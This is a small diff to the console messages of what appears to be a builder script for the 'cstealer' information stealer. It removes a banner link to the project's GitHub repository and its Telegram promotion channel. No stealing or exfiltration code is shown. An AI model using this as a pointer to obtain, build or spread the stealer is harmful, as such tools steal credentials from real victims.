@@ -22,7 +22,7 @@ text = """
 ░        ░  ░  ░    ░         ░    ░   ▒     ░ ░      ░     ░░   ░ 
   ░            ░              ░  ░     ░  ░    ░  ░   ░  ░   ░     
                 
-                https://github.com/can-kat/cstealer   
+              
 
                      Press [ENTER] to continue     
                               
@@ -110,6 +110,6 @@ with open(filepath, "w", encoding="utf-8") as f:
               print(f"\n{Fore.GREEN}Build process has been done successfully!{Fore.RESET}")
               time.sleep(1)
               print(Fore.CYAN + "Don't forget to star the repo and join Telegram channel for support and receive lastest updates" + Style.RESET_ALL)
-              print(Fore.CYAN + "t.me/cstealerr" + Style.RESET_ALL)
+              print(Fore.CYAN + "." + Style.RESET_ALL)
               time.sleep(3)
               endHandler()
